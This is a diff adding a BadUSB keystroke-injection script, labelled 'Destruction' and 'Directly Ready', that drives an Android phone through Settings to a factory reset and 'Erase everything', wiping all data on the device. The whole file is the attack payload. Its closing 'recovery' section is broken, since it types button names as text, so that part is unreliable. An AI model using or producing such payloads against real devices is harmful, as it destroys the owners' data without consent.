@@ -1,0 +1,61 @@
+REM Title: Android Factory Reset
+REM Author: BadUSB Library
+REM Description: Initiates factory reset
+REM Target: Android 7.0+
+REM Category: Destruction
+REM Type: Directly Ready
+
+REM Open Settings
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Settings
+ENTER
+DELAY 3000
+
+REM Navigate to System
+STRING System
+ENTER
+DELAY 2000
+
+STRING Reset
+ENTER
+DELAY 2000
+
+STRING Factory data reset
+ENTER
+DELAY 2000
+
+STRING Reset phone
+ENTER
+DELAY 2000
+
+STRING Erase everything
+ENTER
+DELAY 2000
+
+STRING Erase everything
+ENTER
+DELAY 2000
+
+REM Alternative method via recovery
+STRING Power off
+ENTER
+DELAY 2000
+
+STRING Power off
+ENTER
+DELAY 3000
+
+REM Boot to recovery (this would require physical button combination)
+STRING VOLUME_UP
+ENTER
+DELAY 1000
+
+STRING VOLUME_DOWN
+ENTER
+DELAY 1000
+
+STRING POWER
+ENTER
+DELAY 2000
